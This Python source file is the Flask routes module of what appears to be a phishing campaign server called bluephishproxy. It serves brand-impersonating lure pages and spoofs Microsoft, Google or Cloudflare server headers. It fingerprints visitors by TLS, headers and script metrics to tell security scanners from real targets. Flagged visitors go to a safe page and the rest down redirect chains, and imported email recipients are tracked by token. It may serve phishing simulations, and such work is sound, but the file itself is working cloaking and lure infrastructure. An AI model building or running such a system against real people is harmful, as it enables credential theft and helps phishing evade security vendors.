"""Flask application factory and routes.

Supports:
    - Single-campaign focus mode (auto-setup via env vars)
    - Cloudflare-aware IP extraction and header analysis
    - SQLite database backend for visit/campaign storage
    - API key authentication layer
    - Multi-stage redirect chains per classification
    - JA3/JA4 TLS fingerprinting and HTTP/2 detection
    - Server-Sent Events live feed for operators
    - Operator REST API
"""

from __future__ import annotations

import json
import logging
import queue
import random
import time
import uuid
from functools import wraps
from typing import Any

from flask import (
    Flask,
    Request,
    Response,
    make_response,
    redirect,
    request,
    session,
    jsonify,
    stream_with_context,
)
from werkzeug.middleware.proxy_fix import ProxyFix

from .campaigns import Campaign, create_campaign, delete_campaign, list_campaigns, load_campaign, save_campaign
from .config import Config
from .database import (
    init_db,
    save_visit_db,
    query_visits,
    get_visit,
    get_visit_stats,
    get_vendor_stats,
    get_analytics_db,
    update_analytics_db,
    create_api_key,
    validate_api_key,
    list_api_keys,
    revoke_api_key,
    list_campaigns_db,
    get_recipient_by_token,
    list_recipients,
    import_recipients,
    record_recipient_click,
    get_recipient_stats,
)
from .detection import build_visit_record, evaluate
from .lures import LURE_REGISTRY, list_templates, render_lure
from .redirects import get_redirect_url
from .storage import log_visit
from .webhooks import notify

logger = logging.getLogger("bluephishproxy")

_sse_subscribers: list[queue.Queue[str]] = []

_rate_limit_store: dict[str, list[float]] = {}

# --- Server header spoofing -----------------------------------------------

_SERVER_HEADERS: dict[str, list[dict[str, str]]] = {
    "microsoft": [
        {"Server": "Microsoft-IIS/10.0", "X-Powered-By": "ASP.NET",
         "X-AspNet-Version": "4.0.30319"},
        {"Server": "Microsoft-HTTPAPI/2.0", "X-Powered-By": "ARR/3.0"},
    ],
    "google": [
        {"Server": "gws", "X-XSS-Protection": "0"},
        {"Server": "ESF"},
    ],
    "cloudflare": [
        {"Server": "cloudflare", "CF-RAY": "dummy"},
    ],
    "generic": [
        {"Server": "nginx", "X-Content-Type-Options": "nosniff"},
        {"Server": "Apache/2.4", "X-Content-Type-Options": "nosniff"},
    ],
}


def _get_server_headers(brand: str) -> dict[str, str]:
    brand_key = brand.lower()
    for key, headers_list in _SERVER_HEADERS.items():
        if key in brand_key:
            base = random.choice(headers_list)
            break
    else:
        base = random.choice(_SERVER_HEADERS["generic"])

    return {
        **base,
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "SAMEORIGIN",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    }


def _apply_headers(response: Any, brand: str = "Microsoft") -> Any:
    for k, v in _get_server_headers(brand).items():
        response.headers[k] = v
    return response


def _extract_ip(req: Request, cfg: Config) -> str:
    if cfg.behind_cloudflare:
        cf_ip = req.headers.get("CF-Connecting-IP")
        if cf_ip:
            return cf_ip.strip()
    xff = req.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return req.remote_addr or "0.0.0.0"


def _get_http_version(req: Request) -> str:
    return req.environ.get("SERVER_PROTOCOL", "")


def _check_rate_limit(ip: str, cfg: Config) -> bool:
    if cfg.rate_limit <= 0:
        return True
    now = time.time()
    window = 60.0
    if ip not in _rate_limit_store:
        _rate_limit_store[ip] = []
    _rate_limit_store[ip] = [t for t in _rate_limit_store[ip] if now - t < window]
    if len(_rate_limit_store[ip]) >= cfg.rate_limit:
        return False
    _rate_limit_store[ip].append(now)
    return True


def _broadcast_sse(record: dict[str, Any]) -> None:
    event_data = json.dumps({
        "event": "visit",
        "ip": record.get("ip_address"),
        "org": record.get("org"),
        "country": record.get("country"),
        "classification": record.get("classification"),
        "score": record.get("detection_score"),
        "vendor": record.get("vendor_name"),
        "path": record.get("path"),
        "campaign_id": record.get("campaign_id", "default"),
        "session_id": record.get("session_id"),
        "timestamp": record.get("timestamp"),
        "browser": record.get("browser"),
        "os": record.get("os"),
        "top_signal": record.get("top_signal"),
        "ja3_hash": record.get("ja3_hash"),
        "http_version": record.get("http_version"),
        "tracking_token": record.get("tracking_token"),
        "device_id": record.get("device_id"),
        "is_prefetch": record.get("is_prefetch", False),
        "recipient_id": record.get("recipient_id"),
    }, default=str)
    msg = f"data: {event_data}\n\n"
    dead: list[queue.Queue[str]] = []
    for q in _sse_subscribers:
        try:
            q.put_nowait(msg)
        except queue.Full:
            dead.append(q)
    for q in dead:
        try:
            _sse_subscribers.remove(q)
        except ValueError:
            pass


def _require_auth(cfg: Config):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            auth = request.headers.get("Authorization", "")
            token_param = request.args.get("token", "")

            if auth.startswith("Bearer bpp_") or (token_param and token_param.startswith("bpp_")):
                key = auth.removeprefix("Bearer ").strip() if auth.startswith("Bearer bpp_") else token_param
                key_info = validate_api_key(cfg, key)
                if not key_info:
                    return jsonify({"error": "invalid API key"}), 401
                request.api_key_info = key_info  # type: ignore[attr-defined]
                return f(*args, **kwargs)

            if cfg.operator_token:
                if auth == f"Bearer {cfg.operator_token}" or token_param == cfg.operator_token:
                    return f(*args, **kwargs)
                return jsonify({"error": "unauthorized"}), 401

            return f(*args, **kwargs)
        return wrapper
    return decorator


def _require_admin(cfg: Config):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            key_info = getattr(request, "api_key_info", None)
            if key_info and key_info.get("role") != "admin":
                return jsonify({"error": "admin role required"}), 403
            return f(*args, **kwargs)
        return wrapper
    return decorator


def _auto_setup_campaign(cfg: Config) -> None:
    if not cfg.campaign_name:
        return
    existing = list_campaigns_db(cfg)
    if existing:
        return
    template = cfg.campaign_template or cfg.default_template
    c = create_campaign(
        name=cfg.campaign_name,
        template=template,
        cfg=cfg,
    )
    logger.info("Auto-created campaign '%s' (id=%s) from env config", c.name, c.id)


def _process_visit(
    cfg: Config,
    campaign: Campaign | None = None,
    recipient: dict[str, Any] | None = None,
    tracking_token: str | None = None,
) -> dict[str, Any]:
    session_id = request.cookies.get("csession", str(uuid.uuid4()))
    ip = _extract_ip(request, cfg)
    ua = request.headers.get("User-Agent", "")
    headers = dict(request.headers)
    js_metrics: dict[str, Any] | None = session.get("adv_metrics")
    elapsed_ms: float | None = session.get("metrics_ts")
    http_version = _get_http_version(request)

    record = build_visit_record(
        ip=ip,
        user_agent=ua,
        headers=headers,
        cookies=dict(request.cookies),
        path=request.path,
        method=request.method,
        args=dict(request.args),
        referrer=request.referrer,
        session_id=session_id,
        js_metrics=js_metrics,
        elapsed_ms=elapsed_ms,
        cfg=cfg,
        http_version=http_version,
    )

    if campaign:
        record["campaign_id"] = campaign.id
        record["campaign_name"] = campaign.name
        record["template"] = campaign.template

    if recipient:
        record["recipient_id"] = recipient["id"]
        record["tracking_token"] = tracking_token

    if tracking_token:
        record["tracking_token"] = tracking_token

    if not record.get("is_prefetch") and recipient and tracking_token:
        record_recipient_click(cfg, tracking_token, record.get("device_id"))

    log_visit(record)
    save_visit_db(record, cfg)
    update_analytics_db(record, cfg)

    notify(record, cfg)
    _broadcast_sse(record)

    return record


def _make_redirect_response(
    classification: str,
    cfg: Config,
    campaign: Campaign | None,
    session_id: str,
) -> Response:
    safe_url = (campaign.safe_redirect_url if campaign else cfg.safe_redirect_url)
    flagged_url = (campaign.flagged_redirect_url if campaign else cfg.flagged_redirect_url)
    brand = campaign.brand_name if campaign else cfg.brand_name
    campaign_chains = getattr(campaign, "redirect_chains", None)

    url, chain_html = get_redirect_url(
        classification,
        cfg,
        campaign_chains=campaign_chains,
        safe_url=safe_url,
        flagged_url=flagged_url,
        brand=brand,
    )

    if chain_html:
        resp = make_response(chain_html)
    else:
        resp = redirect(url, code=302)

    resp = _apply_headers(resp, brand)
    resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
    return resp


def create_app(cfg: Config | None = None) -> Flask:
    if cfg is None:
        cfg = Config()

    app = Flask(__name__)

    if cfg.secret_key_is_ephemeral:
        logger.warning(
            "BPP_SECRET_KEY is not set — generating ephemeral key. "
            "Session cookies will not survive restarts."
        )
    app.secret_key = cfg.resolved_secret_key()

    app.wsgi_app = ProxyFix(  # type: ignore[assignment]
        app.wsgi_app,
        x_for=cfg.trusted_proxies,
        x_host=cfg.trusted_proxies,
    )

    cfg.data_dir.mkdir(parents=True, exist_ok=True)
    cfg.analytics_dir.mkdir(parents=True, exist_ok=True)

    init_db(cfg)
    _auto_setup_campaign(cfg)

    # ==================================================================
    # Rate limiting middleware
    # ==================================================================

    @app.before_request
    def check_rate_limit():
        if request.path.startswith("/api/operator/"):
            ip = _extract_ip(request, cfg)
            if not _check_rate_limit(ip, cfg):
                return jsonify({"error": "rate limit exceeded"}), 429

    # ==================================================================
    # Internal endpoints (used by lure templates)
    # ==================================================================

    @app.route("/_bpp/collect", methods=["POST"])
    def collect_metrics():  # type: ignore[return]
        data: dict[str, Any] = request.json or {}
        session["adv_metrics"] = data
        session["metrics_ts"] = data.get("elapsed")
        resp = jsonify({"status": "ok"})
        return _apply_headers(resp, cfg.brand_name)

    @app.route("/_bpp/gate")
    def gate_redirect():  # type: ignore[return]
        campaign_id = session.get("campaign_id")
        campaign = load_campaign(campaign_id, cfg) if campaign_id else None

        tracking_token = session.get("tracking_token")
        recipient = None
        if tracking_token:
            recipient = get_recipient_by_token(cfg, tracking_token)

        record = _process_visit(
            cfg, campaign, recipient=recipient, tracking_token=tracking_token
        )
        classification = record.get("classification", "clean")
        session_id = record.get("session_id", str(uuid.uuid4()))

        return _make_redirect_response(classification, cfg, campaign, session_id)

    @app.route("/api/v2/metrics/collect", methods=["POST"])
    def collect_metrics_legacy():  # type: ignore[return]
        return collect_metrics()

    @app.route("/api/v2/metrics/usr")
    @app.route("/scanning_page")
    def scan_page_legacy():  # type: ignore[return]
        html = render_lure(cfg.default_template, {"brand": cfg.brand_name})
        resp = make_response(html)
        return _apply_headers(resp, cfg.brand_name)

    # ==================================================================
    # Tracked recipient routes: /t/<token>
    # ==================================================================

    @app.route("/t/<token>")
    @app.route("/t/<token>/")
    @app.route("/t/<token>/<path:path>")
    def tracked_entry(token: str, path: str = ""):  # type: ignore[return]
        recipient = get_recipient_by_token(cfg, token)
        if not recipient:
            return make_response("Not Found", 404)

        campaign = load_campaign(recipient["campaign_id"], cfg)
        if not campaign or not campaign.active:
            return make_response("Not Found", 404)

        session["campaign_id"] = campaign.id
        session["tracking_token"] = token

        js_metrics = session.get("adv_metrics")
        if not js_metrics:
            html = render_lure(campaign.template, {
                "brand": campaign.brand_name,
                **campaign.custom_params,
            })
            resp = make_response(html)
            resp = _apply_headers(resp, campaign.brand_name)
            session_id = request.cookies.get("csession", str(uuid.uuid4()))
            resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)

            _process_visit(cfg, campaign, recipient=recipient, tracking_token=token)
            return resp

        record = _process_visit(cfg, campaign, recipient=recipient, tracking_token=token)
        classification = record.get("classification", "clean")
        session_id = record.get("session_id", str(uuid.uuid4()))

        return _make_redirect_response(classification, cfg, campaign, session_id)

    # ==================================================================
    # Campaign routes: /c/<campaign_id>/...
    # ==================================================================

    @app.route("/c/<campaign_id>/", defaults={"path": ""})
    @app.route("/c/<campaign_id>/<path:path>")
    def campaign_entry(campaign_id: str, path: str):  # type: ignore[return]
        campaign = load_campaign(campaign_id, cfg)
        if not campaign or not campaign.active:
            return make_response("Not Found", 404)

        session["campaign_id"] = campaign_id

        js_metrics = session.get("adv_metrics")
        if not js_metrics:
            html = render_lure(campaign.template, {
                "brand": campaign.brand_name,
                **campaign.custom_params,
            })
            resp = make_response(html)
            resp = _apply_headers(resp, campaign.brand_name)
            session_id = request.cookies.get("csession", str(uuid.uuid4()))
            resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)

            _process_visit(cfg, campaign)
            return resp

        record = _process_visit(cfg, campaign)
        classification = record.get("classification", "clean")
        session_id = record.get("session_id", str(uuid.uuid4()))

        return _make_redirect_response(classification, cfg, campaign, session_id)

    # ==================================================================
    # Operator API
    # ==================================================================

    @app.route("/api/operator/campaigns", methods=["GET"])
    @_require_auth(cfg)
    def api_list_campaigns():  # type: ignore[return]
        campaigns = list_campaigns(cfg)
        return jsonify([{
            "id": c.id, "name": c.name, "template": c.template,
            "active": c.active, "created_at": c.created_at,
            "brand_name": c.brand_name,
            "safe_redirect_url": c.safe_redirect_url,
            "description": c.description,
        } for c in campaigns])

    @app.route("/api/operator/campaigns", methods=["POST"])
    @_require_auth(cfg)
    @_require_admin(cfg)
    def api_create_campaign():  # type: ignore[return]
        data = request.json or {}
        name = data.get("name", "Unnamed Campaign")
        template = data.get("template", cfg.default_template)
        if template not in LURE_REGISTRY:
            return jsonify({"error": f"Unknown template: {template}",
                            "available": list(LURE_REGISTRY.keys())}), 400
        c = create_campaign(
            name=name,
            template=template,
            cfg=cfg,
            safe_redirect_url=data.get("safe_redirect_url", ""),
            flagged_redirect_url=data.get("flagged_redirect_url", ""),
            brand_name=data.get("brand_name", ""),
            description=data.get("description", ""),
            custom_params=data.get("custom_params"),
        )
        return jsonify({"id": c.id, "name": c.name, "url": f"/c/{c.id}/"}), 201

    @app.route("/api/operator/campaigns/<campaign_id>", methods=["GET"])
    @_require_auth(cfg)
    def api_get_campaign(campaign_id: str):  # type: ignore[return]
        c = load_campaign(campaign_id, cfg)
        if not c:
            return jsonify({"error": "not found"}), 404
        from dataclasses import asdict
        return jsonify(asdict(c))

    @app.route("/api/operator/campaigns/<campaign_id>", methods=["PUT"])
    @_require_auth(cfg)
    @_require_admin(cfg)
    def api_update_campaign(campaign_id: str):  # type: ignore[return]
        c = load_campaign(campaign_id, cfg)
        if not c:
            return jsonify({"error": "not found"}), 404
        data = request.json or {}
        for field in ("name", "template", "active", "safe_redirect_url",
                      "flagged_redirect_url", "brand_name", "description"):
            if field in data:
                setattr(c, field, data[field])
        if "custom_params" in data:
            c.custom_params = data["custom_params"]
        save_campaign(c, cfg)
        return jsonify({"id": c.id, "status": "updated"})

    @app.route("/api/operator/campaigns/<campaign_id>", methods=["DELETE"])
    @_require_auth(cfg)
    @_require_admin(cfg)
    def api_delete_campaign(campaign_id: str):  # type: ignore[return]
        if delete_campaign(campaign_id, cfg):
            return jsonify({"status": "deleted"})
        return jsonify({"error": "not found"}), 404

    # ==================================================================
    # Recipient / target management
    # ==================================================================

    @app.route("/api/operator/recipients", methods=["GET"])
    @_require_auth(cfg)
    def api_list_recipients():  # type: ignore[return]
        campaign_id = request.args.get("campaign_id")
        recipients = list_recipients(cfg, campaign_id)
        return jsonify(recipients)

    @app.route("/api/operator/recipients", methods=["POST"])
    @_require_auth(cfg)
    @_require_admin(cfg)
    def api_import_recipients():  # type: ignore[return]
        data = request.json or {}
        campaign_id = data.get("campaign_id")
        if not campaign_id:
            return jsonify({"error": "campaign_id required"}), 400

        campaign = load_campaign(campaign_id, cfg)
        if not campaign:
            return jsonify({"error": "campaign not found"}), 404

        targets = data.get("targets", [])
        if not targets:
            return jsonify({"error": "targets list required"}), 400

        for t in targets:
            if "email" not in t:
                return jsonify({"error": "each target needs an 'email' field"}), 400

        results = import_recipients(cfg, campaign_id, targets)
        base_url = request.host_url.rstrip("/")
        for r in results:
            r["tracking_url"] = f"{base_url}/t/{r['token']}"

        return jsonify({
            "imported": len(results),
            "recipients": results,
        }), 201

    @app.route("/api/operator/recipients/stats", methods=["GET"])
    @_require_auth(cfg)
    def api_recipient_stats():  # type: ignore[return]
        campaign_id = request.args.get("campaign_id")
        stats = get_recipient_stats(cfg, campaign_id)
        return jsonify(stats)

    @app.route("/api/operator/recipients/<int:recipient_id>", methods=["DELETE"])
    @_require_auth(cfg)
    @_require_admin(cfg)
    def api_delete_recipient(recipient_id: int):  # type: ignore[return]
        from .database import delete_recipient
        if delete_recipient(cfg, recipient_id):
            return jsonify({"status": "deleted"})
        return jsonify({"error": "not found"}), 404

    @app.route("/api/operator/templates", methods=["GET"])
    @_require_auth(cfg)
    def api_list_templates():  # type: ignore[return]
        return jsonify(list_templates())

    @app.route("/api/operator/templates/<template_id>/preview", methods=["GET"])
    @_require_auth(cfg)
    def api_preview_template(template_id: str):  # type: ignore[return]
        if template_id not in LURE_REGISTRY:
            return jsonify({"error": "not found"}), 404
        params = dict(request.args)
        params.setdefault("brand", cfg.brand_name)
        html = render_lure(template_id, params)
        return make_response(html)

    @app.route("/api/operator/visits", methods=["GET"])
    @_require_auth(cfg)
    def api_list_visits():  # type: ignore[return]
        limit = int(request.args.get("limit", "50"))
        offset = int(request.args.get("offset", "0"))
        campaign_filter = request.args.get("campaign_id")
        classification_filter = request.args.get("classification")
        ip_filter = request.args.get("ip_address")

        visits = query_visits(
            cfg,
            campaign_id=campaign_filter,
            classification=classification_filter,
            ip_address=ip_filter,
            limit=limit,
            offset=offset,
        )
        return jsonify(visits)

    @app.route("/api/operator/visits/<session_id>", methods=["GET"])
    @_require_auth(cfg)
    def api_get_visit(session_id: str):  # type: ignore[return]
        visit = get_visit(cfg, session_id)
        if visit:
            return jsonify(visit)
        return jsonify({"error": "not found"}), 404

    @app.route("/api/operator/stats", methods=["GET"])
    @_require_auth(cfg)
    def api_stats():  # type: ignore[return]
        campaign_id = request.args.get("campaign_id")
        stats = get_visit_stats(cfg, campaign_id)
        vendor_stats = get_vendor_stats(cfg, campaign_id)
        return jsonify({"overview": stats, "vendors": vendor_stats})

    @app.route("/api/operator/analytics", methods=["GET"])
    @_require_auth(cfg)
    def api_analytics():  # type: ignore[return]
        from .reporting import generate_markdown
        fmt = request.args.get("format", "json")
        if fmt == "markdown":
            return make_response(generate_markdown(cfg))
        days = int(request.args.get("days", "30"))
        results = get_analytics_db(cfg, days=days)
        return jsonify(results)

    # ==================================================================
    # API key management endpoints
    # ==================================================================

    @app.route("/api/operator/apikeys", methods=["GET"])
    @_require_auth(cfg)
    @_require_admin(cfg)
    def api_list_keys():  # type: ignore[return]
        keys = list_api_keys(cfg)
        return jsonify(keys)

    @app.route("/api/operator/apikeys", methods=["POST"])
    @_require_auth(cfg)
    @_require_admin(cfg)
    def api_create_key():  # type: ignore[return]
        data = request.json or {}
        name = data.get("name", "unnamed")
        role = data.get("role", "admin")
        if role not in ("admin", "readonly"):
            return jsonify({"error": "role must be 'admin' or 'readonly'"}), 400
        key = create_api_key(cfg, name, role)
        return jsonify({"key": key, "name": name, "role": role}), 201

    @app.route("/api/operator/apikeys/<int:key_id>", methods=["DELETE"])
    @_require_auth(cfg)
    @_require_admin(cfg)
    def api_revoke_key(key_id: int):  # type: ignore[return]
        if revoke_api_key(cfg, key_id):
            return jsonify({"status": "revoked"})
        return jsonify({"error": "not found"}), 404

    # ==================================================================
    # SSE live feed
    # ==================================================================

    @app.route("/api/operator/feed")
    @_require_auth(cfg)
    def sse_feed():  # type: ignore[return]
        def stream():
            q: queue.Queue[str] = queue.Queue(maxsize=100)
            _sse_subscribers.append(q)
            try:
                yield "data: {\"event\": \"connected\"}\n\n"
                while True:
                    try:
                        msg = q.get(timeout=30)
                        yield msg
                    except queue.Empty:
                        yield ": keepalive\n\n"
            except GeneratorExit:
                pass
            finally:
                try:
                    _sse_subscribers.remove(q)
                except ValueError:
                    pass

        return Response(
            stream_with_context(stream()),
            mimetype="text/event-stream",
            headers={
                "Cache-Control": "no-cache",
                "X-Accel-Buffering": "no",
                "Connection": "keep-alive",
            },
        )

    # ==================================================================
    # Operator dashboard
    # ==================================================================

    @app.route("/api/operator/dashboard")
    @_require_auth(cfg)
    def operator_dashboard():  # type: ignore[return]
        from .dashboard import dashboard_html
        resp = make_response(dashboard_html(cfg))
        resp.content_type = "text/html; charset=utf-8"
        return resp

    # ==================================================================
    # Health check
    # ==================================================================

    @app.route("/health")
    def health_check():  # type: ignore[return]
        return jsonify({"status": "ok", "version": "3.0"})

    # ==================================================================
    # Default catch-all (non-campaign links)
    # ==================================================================

    @app.route("/", defaults={"uri": ""})
    @app.route("/<path:uri>")
    def catch_all(uri: str):  # type: ignore[return]
        session_id = request.cookies.get("csession", str(uuid.uuid4()))
        js_metrics = session.get("adv_metrics")

        if not js_metrics:
            html = render_lure(cfg.default_template, {"brand": cfg.brand_name})
            resp = make_response(html)
            resp = _apply_headers(resp, cfg.brand_name)
            resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)

            _process_visit(cfg)
            return resp

        record = _process_visit(cfg)
        classification = record.get("classification", "clean")
        session_id = record.get("session_id", session_id)

        return _make_redirect_response(classification, cfg, None, session_id)

    return app
